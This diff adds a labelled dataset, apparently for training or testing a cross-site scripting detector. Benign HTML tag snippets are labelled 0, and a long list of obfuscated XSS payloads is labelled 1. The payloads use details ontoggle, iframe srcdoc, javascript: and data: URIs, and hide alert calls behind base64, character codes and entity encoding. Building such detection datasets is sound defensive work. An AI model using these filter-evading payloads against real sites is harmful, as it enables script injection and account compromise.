@@ -1,0 +1,2600 @@
+<a alt="benign">normal</a>	0
+<a alt="benign">sample</a>	0
+<a alt="content">benign</a>	0
+<a alt="content">sample</a>	0
+<a alt="hello">benign</a>	0
+<a alt="hello">hello</a>	0
+<a alt="hello">test</a>	0
+<a alt="hello">world</a>	0
+<a alt="normal">hello</a>	0
+<a alt="test">content</a>	0
+<a alt="test">sample</a>	0
+<a alt="test">test</a>	0
+<a alt="world">content</a>	0
+<a alt="world">test</a>	0
+<a alt="world">world</a>	0
+<a class="benign">hello</a>	0
+<a class="benign">normal</a>	0
+<a class="benign">sample</a>	0
+<a class="benign">test</a>	0
+<a class="benign">world</a>	0
+<a class="content">normal</a>	0
+<a class="content">sample</a>	0
+<a class="hello">content</a>	0
+<a class="normal">normal</a>	0
+<a class="normal">sample</a>	0
+<a class="sample">content</a>	0
+<a class="sample">hello</a>	0
+<a class="sample">world</a>	0
+<a class="test">normal</a>	0
+<a class="world">content</a>	0
+<a class="world">sample</a>	0
+<a class="world">world</a>	0
+<a href="benign">hello</a>	0
+<a href="benign">sample</a>	0
+<a href="content">hello</a>	0
+<a href="content">normal</a>	0
+<a href="content">sample</a>	0
+<a href="hello">hello</a>	0
+<a href="hello">test</a>	0
+<a href="normal">content</a>	0
+<a href="normal">normal</a>	0
+<a href="normal">test</a>	0
+<a href="sample">content</a>	0
+<a href="world">normal</a>	0
+<a href="world">test</a>	0
+<a href="world">world</a>	0
+<a id="benign">content</a>	0
+<a id="content">normal</a>	0
+<a id="content">world</a>	0
+<a id="hello">benign</a>	0
+<a id="hello">content</a>	0
+<a id="hello">hello</a>	0
+<a id="normal">benign</a>	0
+<a id="normal">normal</a>	0
+<a id="normal">world</a>	0
+<a id="sample">benign</a>	0
+<a id="sample">normal</a>	0
+<a id="sample">sample</a>	0
+<a id="test">normal</a>	0
+<a id="world">benign</a>	0
+<a id="world">content</a>	0
+<a src="benign">benign</a>	0
+<a src="benign">content</a>	0
+<a src="benign">sample</a>	0
+<a src="benign">test</a>	0
+<a src="benign">world</a>	0
+<a src="content">benign</a>	0
+<a src="content">world</a>	0
+<a src="hello">benign</a>	0
+<a src="hello">world</a>	0
+<a src="normal">content</a>	0
+<a src="normal">world</a>	0
+<a src="sample">benign</a>	0
+<a src="sample">content</a>	0
+<a src="sample">normal</a>	0
+<a src="sample">sample</a>	0
+<a src="test">benign</a>	0
+<a src="test">normal</a>	0
+<a src="test">sample</a>	0
+<a src="world">test</a>	0
+<a style="benign">content</a>	0
+<a style="benign">hello</a>	0
+<a style="content">benign</a>	0
+<a style="content">content</a>	0
+<a style="content">hello</a>	0
+<a style="content">sample</a>	0
+<a style="hello">benign</a>	0
+<a style="hello">hello</a>	0
+<a style="hello">test</a>	0
+<a style="hello">world</a>	0
+<a style="normal">benign</a>	0
+<a style="normal">sample</a>	0
+<a style="normal">world</a>	0
+<a style="sample">hello</a>	0
+<a style="sample">normal</a>	0
+<a style="sample">sample</a>	0
+<a style="test">hello</a>	0
+<a style="world">benign</a>	0
+<a style="world">world</a>	0
+<a title="benign">content</a>	0
+<a title="benign">hello</a>	0
+<a title="benign">test</a>	0
+<a title="content">sample</a>	0
+<a title="content">test</a>	0
+<a title="hello">test</a>	0
+<a title="normal">hello</a>	0
+<a title="normal">world</a>	0
+<a title="sample">benign</a>	0
+<a title="sample">hello</a>	0
+<a title="test">normal</a>	0
+<a title="test">world</a>	0
+<a title="world">normal</a>	0
+<a title="world">sample</a>	0
+<details ontoggle=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29')) open>	1
+<details open ontoggle="&#97;&#108;&#101;&#114;&#116;(1)"></details>	1
+<details open ontoggle="eval(String.fromCharCode(97,108,101,114,116,40,49,41))"></details>	1
+<details open ontoggle="setTimeout('al'+'ert(1)',0)"></details>	1
+<details open ontoggle="window['al'+'ert']('XSS')"></details>	1
+<details open ontoggle="window['al'+'ert'](1)"></details>	1
+<details open ontoggle='(window.Function(atob("YWxlcnQoMSk=")))()'></details>	1
+<details open ontoggle='eval("al"+"ert(1)")'></details>	1
+<details open ontoggle='eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))'></details>	1
+<details open ontoggle='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'></details>	1
+<details open ontoggle='eval(atob("YWxlcnQoMSk="))'></details>	1
+<details open ontoggle='new Function("al"+"ert(1)")()'></details>	1
+<details open ontoggle='window[[["\x61","\x6c","\x65","\x72","\x74"].join("")]](1)'></details>	1
+<details open ontoggle=Function('\u0061\u006c\u0065\u0072\u0074(1)')()></details>	1
+<details open ontoggle=Function('al'+'ert(1)')()></details>	1
+<details open ontoggle=eval('al'+'ert(1)')></details>	1
+<details open ontoggle=eval('al'+'ert(3)')>	1
+<details open ontoggle=eval('window["al"+"ert"](1)')>	1
+<details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>	1
+<details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></details>	1
+<details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,50,41))>	1
+<details open ontoggle=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>	1
+<details open ontoggle=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)></details>	1
+<details open ontoggle=eval(`window['al'+'ert'](1)`)>	1
+<details open ontoggle=eval(atob('YWxlcnQoMSk='))>	1
+<details open ontoggle=eval(atob('YWxlcnQoMSk='))></details>	1
+<details open ontoggle=eval(atob('YWxlcnQoMik='))>	1
+<details open ontoggle=eval(atob('YWxlcnQoNyk='))>	1
+<details open ontoggle=eval(decodeURI('%61%6C%65%72%74%28%31%29'))></details>	1
+<details open ontoggle=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))>	1
+<details open ontoggle=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))></details>	1
+<details open ontoggle=eval(decodeURIComponent('%61%6c%65%72%74(1)'))>	1
+<details open ontoggle=eval(decodeURIComponent('\u0061\u006c\u0065\u0072\u0074(1)'))></details>	1
+<details open ontoggle=setTimeout('\u0061\u006c\u0065\u0072\u0074(1)',0)>	1
+<details open ontoggle=setTimeout(`al`+`ert(1)`,0)></details>	1
+<details open ontoggle=setTimeout(eval('String.fromCharCode(97,108,101,114,116,40,49,41)'),0)></details>	1
+<details open ontoggle=window[''+String.fromCharCode(97,108,101,114,116)](1)>	1
+<details open ontoggle=window['\u0061\u006c\u0065\u0072\u0074'](1)></details>	1
+<details open ontoggle=window['a'+'l'+'ert'](1)>	1
+<details open ontoggle=window['a'+'lert'](1)>	1
+<details open ontoggle=window['al'+'\u0065rt'](1)>	1
+<details open ontoggle=window['al'+'\x65rt'](1)>	1
+<details open ontoggle=window['al'+'ert'](1)>	1
+<details open ontoggle=window['al'+'ert'](1)></details>	1
+<details open ontoggle=window['al\x65rt'](1)>	1
+<details open ontoggle=window[String.fromCharCode(97,108,101,114,116)](1)>	1
+<details open ontoggle=window[`al`+`ert`](1)>	1
+<details open ontoggle=window[`al`+`ert`](1)></details>	1
+<details open ontoggle=window[atob('YWxlcnQ=')](1)></details>	1
+<div alt="benign">benign</div>	0
+<div alt="benign">sample</div>	0
+<div alt="content">benign</div>	0
+<div alt="content">normal</div>	0
+<div alt="content">sample</div>	0
+<div alt="hello">benign</div>	0
+<div alt="hello">test</div>	0
+<div alt="normal">benign</div>	0
+<div alt="normal">hello</div>	0
+<div alt="sample">hello</div>	0
+<div alt="sample">normal</div>	0
+<div alt="test">benign</div>	0
+<div alt="test">hello</div>	0
+<div alt="test">test</div>	0
+<div alt="test">world</div>	0
+<div alt="world">benign</div>	0
+<div alt="world">hello</div>	0
+<div class="benign">content</div>	0
+<div class="content">benign</div>	0
+<div class="content">content</div>	0
+<div class="content">sample</div>	0
+<div class="content">test</div>	0
+<div class="hello">benign</div>	0
+<div class="hello">content</div>	0
+<div class="hello">sample</div>	0
+<div class="hello">test</div>	0
+<div class="hello">world</div>	0
+<div class="normal">hello</div>	0
+<div class="normal">normal</div>	0
+<div class="normal">sample</div>	0
+<div class="normal">world</div>	0
+<div class="sample">hello</div>	0
+<div class="sample">sample</div>	0
+<div class="test">benign</div>	0
+<div class="test">content</div>	0
+<div class="test">hello</div>	0
+<div class="test">sample</div>	0
+<div class="test">test</div>	0
+<div class="test">world</div>	0
+<div class="world">content</div>	0
+<div class="world">normal</div>	0
+<div class="world">sample</div>	0
+<div href="benign">content</div>	0
+<div href="benign">hello</div>	0
+<div href="benign">normal</div>	0
+<div href="benign">test</div>	0
+<div href="content">hello</div>	0
+<div href="content">test</div>	0
+<div href="hello">content</div>	0
+<div href="hello">normal</div>	0
+<div href="hello">sample</div>	0
+<div href="normal">normal</div>	0
+<div href="sample">benign</div>	0
+<div href="test">normal</div>	0
+<div href="test">sample</div>	0
+<div href="test">world</div>	0
+<div href="world">benign</div>	0
+<div href="world">normal</div>	0
+<div id="content">hello</div>	0
+<div id="content">normal</div>	0
+<div id="content">world</div>	0
+<div id="hello">content</div>	0
+<div id="hello">hello</div>	0
+<div id="hello">normal</div>	0
+<div id="hello">world</div>	0
+<div id="normal">benign</div>	0
+<div id="sample">benign</div>	0
+<div id="sample">world</div>	0
+<div id="test">content</div>	0
+<div id="world">benign</div>	0
+<div id="world">world</div>	0
+<div src="benign">benign</div>	0
+<div src="benign">content</div>	0
+<div src="benign">normal</div>	0
+<div src="benign">sample</div>	0
+<div src="benign">test</div>	0
+<div src="content">benign</div>	0
+<div src="content">content</div>	0
+<div src="content">hello</div>	0
+<div src="content">normal</div>	0
+<div src="content">test</div>	0
+<div src="hello">hello</div>	0
+<div src="hello">normal</div>	0
+<div src="hello">test</div>	0
+<div src="normal">content</div>	0
+<div src="normal">normal</div>	0
+<div src="sample">benign</div>	0
+<div src="sample">content</div>	0
+<div src="sample">test</div>	0
+<div src="test">normal</div>	0
+<div src="test">test</div>	0
+<div src="world">benign</div>	0
+<div src="world">normal</div>	0
+<div src="world">sample</div>	0
+<div style="benign">content</div>	0
+<div style="benign">normal</div>	0
+<div style="benign">sample</div>	0
+<div style="benign">test</div>	0
+<div style="content">content</div>	0
+<div style="content">sample</div>	0
+<div style="content">test</div>	0
+<div style="hello">benign</div>	0
+<div style="hello">hello</div>	0
+<div style="hello">normal</div>	0
+<div style="hello">world</div>	0
+<div style="normal">content</div>	0
+<div style="normal">normal</div>	0
+<div style="normal">world</div>	0
+<div style="sample">benign</div>	0
+<div style="sample">normal</div>	0
+<div style="sample">world</div>	0
+<div style="test">normal</div>	0
+<div style="world">benign</div>	0
+<div style="world">content</div>	0
+<div style="world">hello</div>	0
+<div style="world">normal</div>	0
+<div style="world">sample</div>	0
+<div title="benign">sample</div>	0
+<div title="content">normal</div>	0
+<div title="content">test</div>	0
+<div title="hello">normal</div>	0
+<div title="normal">benign</div>	0
+<div title="normal">test</div>	0
+<div title="sample">benign</div>	0
+<div title="test">content</div>	0
+<div title="test">hello</div>	0
+<div title="test">normal</div>	0
+<div title="world">benign</div>	0
+<div title="world">hello</div>	0
+<div title="world">sample</div>	0
+<iframe onload="eval(atob('YWxlcnQoJ1hTUycp'))"></iframe>	1
+<iframe sRcDoC="<img src=x onerror=window[unescape(escape`alert`)](00)>"></iframe>	1
+<iframe src="data:text/html,<body onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></body>">	1
+<iframe src="data:text/html,<body onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></body>"></iframe>	1
+<iframe src="data:text/html,<body onload=eval(atob('YWxlcnQoMSk='))></body>">	1
+<iframe src="data:text/html,<body onload=eval(atob('YWxlcnQoMSk='))></body>"></iframe>	1
+<iframe src="data:text/html,<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></svg>">	1
+<iframe src="data:text/html,<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></svg>"></iframe>	1
+<iframe src="data:text/html,<svg onload=eval(atob('YWxlcnQoMSk='))></svg>">	1
+<iframe src="data:text/html,<svg onload=eval(atob('YWxlcnQoMSk='))></svg>"></iframe>	1
+<iframe src="data:text/html,<svg%20onload=%61lert%281%29>">	1
+<iframe src="data:text/html;base64,PGltZyBzcmM9IiIgb25lcnJvcj1hbGVydCgxKT4=">	1
+<iframe src="data:text/html;base64,PGltZyBzcmM9XCIiIG9uZXJyb3I9YWxlcnQoMik+">	1
+<iframe src="data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"></iframe>	1
+<iframe src="data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+Cg==">	1
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></iframe>	1
+<iframe src="javascript:%61%6c%65%72%74%28%27%58%53%53%27%29"></iframe>	1
+<iframe src="javascript:&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#x3a;&#97;&#108;&#101;&#114;&#116;&#x28;&#39;&#88;&#83;&#83;&#39;&#x29;">	1
+<iframe src="javascript:&#97l&#x65rt(('XSS'));">	1
+<iframe src="javascript:((()=>{window[`al`+`ert`](1)})())"></iframe>	1
+<iframe src="javascript:\u0065val('al'+'ert(1)')"></iframe>	1
+<iframe src="javascript:al&#101;rt('XSS')">	1
+<iframe src="javascript:al\u0065rt('XSS')"></iframe>	1
+<iframe src="javascript:alert&#96;XSS&#96;">	1
+<iframe src="javascript:eval('\x61\x6c\x65\x72\x74(3)')">	1
+<iframe src="javascript:eval('\x61\x6c\x65\x72\x74\x28\x60\x31\x60\x29')">	1
+<iframe src="javascript:eval('alert(' + String.fromCharCode(49) + ')')">	1
+<iframe src="javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))"></iframe>	1
+<iframe src="javascript:eval(atob('YWxlcnQoIlhTUyIp'))"></iframe>	1
+<iframe src="javascript:eval(atob('YWxlcnQoMSk='))">	1
+<iframe src="javascript:eval(atob('YWxlcnQoMSk='))"></iframe>	1
+<iframe src="javascript:eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))"></iframe>	1
+<iframe src="javascript:eval(unescape('%61%6c%65%72%74%28%31%29'))"></iframe>	1
+<iframe src="javascript:func=setTimeout;funp='ale';c=unescape('%72%74(1)');func(funp+c)">	1
+<iframe src="javascript:new Function('al'+'ert(`XSS`)')()">	1
+<iframe src="javascript:var script=document.createElement('script');script.innerText=String.fromCharCode(97,108,101,114,116,40,52,50,41);document.body.appendChild(script)"></iframe>	1
+<iframe src="javascript:void (window[`ale`+'rt']('XSS'))">	1
+<iframe src="javascript:window['\x61\x6c\x65\x72\x74'](1)">	1
+<iframe src="javascript:window['al'+'ert'](1)">	1
+<iframe src="javascript:window[`al`+`ert`](1)"></iframe>	1
+<iframe src="javascript:x='alert';window[x](64);"></iframe>	1
+<iframe src='data:text/html,<script>eval(atob("YWxlcnQoJ0gzUicp"))</script>'></iframe>	1
+<iframe src='data:text/html;base64,PHNjcmlwdD53aW5kb3dbJ2FsZXJ0J10oMSk8L3NjcmlwdD4='>	1
+<iframe src='data:text/html;base64,PHNjcmlwdD5ldmFsKCdhbGVydCgxKScpPC9zY3JpcHQ+'>	1
+<iframe src='data:text/html;base64,PHNjcmlwdD5ldmFsKCdhbGVydCgyKScpPC9zY3JpcHQ+'>	1
+<iframe src='javascri&#x70;t:eval(String.fromCharCode(97,108,101,114,116,40,39,77,83,71,39,41))'>	1
+<iframe src='javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))'></iframe>	1
+<iframe src='javascript:eval(String.fromCharCode(97,108,101,114,116,40,48,41))'></iframe>	1
+<iframe src=data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+>	1
+<iframe src=javascript:\u0065val(setTimeout("\x61lert(1)",1))>	1
+<iframe src=javascript:alert.bind(null,1)()>	1
+<iframe srcdoc="&lt;img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#39;&#88;&#83;&#83;&#39;&#x29;&gt;">	1
+<iframe srcdoc="<body onload=eval('al'+'ert(1)')>"></iframe>	1
+<iframe srcdoc="<body onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>">	1
+<iframe srcdoc="<body onload=eval(atob('YWxlcnQoMSk='))>">	1
+<iframe srcdoc="<body onload=eval(atob('YWxlcnQoMSk='))>"></iframe>	1
+<iframe srcdoc="<body onload=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))>">	1
+<iframe srcdoc="<details open ontoggle=eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))></details>"></iframe>	1
+<iframe srcdoc="<details open ontoggle=eval(decodeURIComponent('%61%6C%65%72%74(1)'))></details>"></iframe>	1
+<iframe srcdoc="<details open ontoggle=window['al'+'ert'](1)>"></iframe>	1
+<iframe srcdoc="<iframe onload=&#x61;lert&#x28;&#x31;&#x29;>">	1
+<iframe srcdoc="<iframe srcdoc='<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'></iframe>"></iframe>	1
+<iframe srcdoc="<iframe srcdoc='<img src=x onerror=eval(atob(`YWxlcnQoMSk=`))>'>"></iframe>	1
+<iframe srcdoc="<img src=# onerror=setTimeout(`alert\`4\``,0)>"></iframe>	1
+<iframe srcdoc="<img src='x' onerror=eval('window.ale'+'rt(22)')>"></iframe>	1
+<iframe srcdoc="<img src='x' onerror=eval(atob('YWxlcnQoMSk='))>"></iframe>	1
+<iframe srcdoc="<img src='x' onerror=eval(atob('YWxlcnQoNik='))>"></iframe>	1
+<iframe srcdoc="<img src='x' onerror=window['al'+'ert'](12)>"></iframe>	1
+<iframe srcdoc="<img src=1 onerror=alert(String.fromCharCode(88,83,83))>">	1
+<iframe srcdoc="<img src=1 onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"></iframe>	1
+<iframe srcdoc="<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>"></iframe>	1
+<iframe srcdoc="<img src=1 onerror=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),0)>"></iframe>	1
+<iframe srcdoc="<img src=1 onerror=window['al'+'ert'](1)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=&#97;&#x6c;&#x65;&#x72;&#116;&#40;1&#41;>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x32;&#x33;&#x29;>">	1
+<iframe srcdoc="<img src=x onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x32;&#x33;&#x29;&#x27;&#x29;>">	1
+<iframe srcdoc="<img src=x onerror=&#x73;&#x65;&#x74;&#x54;&#x69;&#x6d;&#x65;&#x6f;&#x75;&#x74;&#x28;&#x27;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x32;&#x33;&#x29;&#x27;&#x2c;&#x30;&#x29;>">	1
+<iframe srcdoc="<img src=x onerror='(new Function(`alert(20)`))()'>">	1
+<iframe srcdoc="<img src=x onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>">	1
+<iframe srcdoc="<img src=x onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>"></iframe>	1
+<iframe srcdoc="<img src=x onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,49,49,41))'>">	1
+<iframe srcdoc="<img src=x onerror='eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)'>"></iframe>	1
+<iframe srcdoc="<img src=x onerror='eval(`al\x65rt(32)`)'>">	1
+<iframe srcdoc="<img src=x onerror='eval(atob(`YWxlcnQoMSk=`))'>"></iframe>	1
+<iframe srcdoc="<img src=x onerror='eval(unescape(&#34;%61%6c%65%72%74%28%27%58%53%53%27%29&#34;))'>">	1
+<iframe srcdoc="<img src=x onerror='setTimeout(`alert(44)`,0)'>">	1
+<iframe srcdoc="<img src=x onerror='window.alert(1)'>"></iframe>	1
+<iframe srcdoc="<img src=x onerror='window[&quot;alert&quot;](1)'>"></iframe>	1
+<iframe srcdoc="<img src=x onerror='window[String.fromCharCode(97,108,101,114,116)](1)'>">	1
+<iframe srcdoc="<img src=x onerror='window[`al`+`ert`](1)'>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=Function('&#97;&#108;&#101;&#114;&#116;(2)')() />"></iframe>	1
+<iframe srcdoc="<img src=x onerror=Function('al'+'ert(1)')()>">	1
+<iframe srcdoc="<img src=x onerror=Function('javascri'+'pt:alert(1)')()>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(&#39;&#97;&#108;&#101;&#114;&#116;(1)&#39;)>">	1
+<iframe srcdoc="<img src=x onerror=eval('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)')>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval('\\u0061\\u006c\\u0065\\u0072\\u0074(1)')>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval('\u0061\u006c\u0065\u0072\u0074(1)')>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval('al'+'ert(1)')>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval('al'+String.fromCharCode(101,114,116)+'(1)')>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval('window'+'.alert(1)')>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(0x61)+String.fromCharCode(0x6c)+String.fromCharCode(0x65)+String.fromCharCode(0x72)+String.fromCharCode(0x74)+'(111)')>">	1
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(119,105,110,100,111,119,32,46,32,97,108,101,114,116,40,49,41))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(1)')>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(111)')>">	1
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(39)+String.fromCharCode(88)+String.fromCharCode(83)+String.fromCharCode(83)+String.fromCharCode(39)+String.fromCharCode(41))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97,108)+String.fromCharCode(101,114,116)+'(1)')>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116)+'(1)')>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116)+`(1)`)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>">	1
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) />"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>">	1
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,49,49,41))>">	1
+<iframe srcdoc="<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>" />	1
+<iframe srcdoc="<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>" ></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)></iframe>">	1
+<iframe srcdoc="<img src=x onerror=eval(`\u0061\u006c\u0065\u0072\u0074(1)`)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(`window['\\x61lert'](1)`)>" ></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(atob(&#34;d2luZG93LmFsZXJ0KDEp&#34;))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(atob(&#39;YWxlcnQoMSk=&#39;))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(atob(&#x27;YWxlcnQoMSk=&#x27;))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(atob(&quot;d2luZG93WydhbGVydCddKDEp&quot;))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(atob('YWx'+'lcnQoMSk='))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQ='))(1)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>">	1
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>">	1
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMTEp'))>">	1
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMTEwKQ=='))>">	1
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMTExKQ=='))>">	1
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMTExKQ=='))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMTIzKQ=='))>">	1
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(atob('d2luZG93WydhbGVydCddKDEp'))>">	1
+<iframe srcdoc="<img src=x onerror=eval(atob(`YWxlcnQoMSk=`))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(decodeURIComponent(&#34;%77%69%6e%64%6f%77%5b%27%61%6c%65%72%74%27%5d%28%31%29&#34;))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(decodeURIComponent(&#39;%61%6c%65%72%74%28%31%29&#39;))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(decodeURIComponent(&#x27;%61%6C%65%72%74(1)&#x27;))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(decodeURIComponent('%61%6c%65%72%74%28%31%31%31%29'))>">	1
+<iframe srcdoc="<img src=x onerror=eval(decodeURIComponent('%61%6c%65%72%74(1)'))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(decodeURIComponent('%77%69%6e%64%6f%77%2e%61%6c%65%72%74%28%31%29'))>">	1
+<iframe srcdoc="<img src=x onerror=eval(decodeURIComponent('%77%69%6e%64%6f%77%5b%27%61%6c%65%72%74%27%5d%28%31%29'))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(decodeURIComponent('al%65rt(1)'))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(eval('Str'+'\u0069ng.fromCharCode')(97,108,101,114,116,40,49,41))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(eval('Str'+'ing.fromCharCode')(97,108,101,114,116,40,49,41))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(unescape('%61%6C%65%72%74%28%27%58%53%53%27%29'))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(unescape('%61%6C%65%72%74%281%29'))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(unescape('%61%6C%65%72%74(1)'))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(unescape('%61%6c%65%72%74%28%27%58%53%53%27%29'))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(unescape('%61%6c%65%72%74%28%31%31%31%29'))>">	1
+<iframe srcdoc="<img src=x onerror=eval(unescape('%61%6c%65%72%74(1)'))>">	1
+<iframe srcdoc="<img src=x onerror=eval(unescape('%61%6c%65%72%74(1)'))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(unescape('%61%6c%65%72%74(49)'))>">	1
+<iframe srcdoc="<img src=x onerror=eval(unescape('%u0061%u006c%u0065%u0072%u0074%28%u0031%u0031%u0031%29'))>">	1
+<iframe srcdoc="<img src=x onerror=eval(window.atob('YWxlcnQoMSk='))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=eval(window['al'+'ert'](1))>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=import('data:text/javascript,alert(1)')>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=location=`javascript:alert\`2\``>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setInterval('al'+'ert(1)',1000)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout(&#x27;&#x61;&#x6C;&#x65;&#x72;&#x74;(1)&#x27;,0)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)',0)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout('a'+'lert(1)',0)>"></iframe>	1
+<iframe srcdoc="<img src=x onerror=setTimeout('al'+'\x65rt(1)',0)>"></iframe>	1
